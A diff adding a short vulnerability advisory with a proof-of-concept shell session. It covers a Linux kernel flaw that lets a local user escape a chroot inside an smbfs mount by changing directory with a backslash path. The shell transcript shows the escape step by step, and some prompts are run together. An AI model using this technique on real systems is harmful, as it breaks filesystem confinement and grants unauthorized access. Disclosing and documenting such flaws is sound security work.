@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/17735/info
+
+The Linux Kernel is prone to a vulnerability that allows attackers to bypass a security restriction. This issue is due to a failure in the kernel to properly sanitize user-supplied data.
+
+The problem affects chroot inside of an SMB-mounted filesystem ('smbfs'). A local attacker who is bounded by the chroot can exploit this issue to bypass the chroot restriction and gain unauthorized access to the filesystem.
+
+root@server me]# pwd
+/path/to/my/dir
+[root@server me]# ls
+bin chroot etc lib
+[root@server me]# chroot .
+bash-2.05a# pwd
+/
+bash-2.05a# ls
+bin chroot etc lib
+bash-2.05a# cd ..\bash-2.05a# pwd
+/..bash-2.05a# ls
+<list of files from parent>
